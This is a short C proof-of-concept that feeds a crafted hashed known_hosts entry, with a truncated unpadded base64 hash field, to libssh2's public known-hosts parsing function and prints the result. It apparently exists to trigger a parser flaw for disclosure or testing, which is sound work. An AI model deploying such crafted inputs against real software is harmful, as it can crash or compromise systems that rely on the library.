/*
 * Known-hosts parsing PoC.
 *
 * Reads a crafted hashed known_hosts entry through the public API.
 * The entry is a syntactically valid OpenSSH "|1|<salt>|<hash>" line;
 * the hash field is a short unpadded base64 group.
 */

#include <libssh2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *kh;
    int rc;

    /* |1|<salt>|<hash> <key type> <base64 key> <comment> */
    const char *line =
        "|1|c2FsdA==|QUFBQUF ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAABgQDNG9eX7U5YvJ6mfXha4n8LbGaT3nR2"
        "xLQbMPCKx2OMBxKcTxYy0YopF7DZ1J7kAaLofgYyv0t5eXRWd2Sf9zMlN5V8j4"
        "wYUI2qKmOcEtUSJ2dEHpRqKz3PwYqXNTZaZaYfVyGxWO1suHqpzbTqGXjXda"
        "wwzIc7YyBb comment@example\n";

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init() failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init() failed\n");
        return 1;
    }

    kh = libssh2_knownhost_init(session);
    if(!kh) {
        fprintf(stderr, "libssh2_knownhost_init() failed\n");
        return 1;
    }

    rc = libssh2_knownhost_readline(kh, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    printf("libssh2_knownhost_readline() rc = %d\n", rc);

    libssh2_knownhost_free(kh);
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
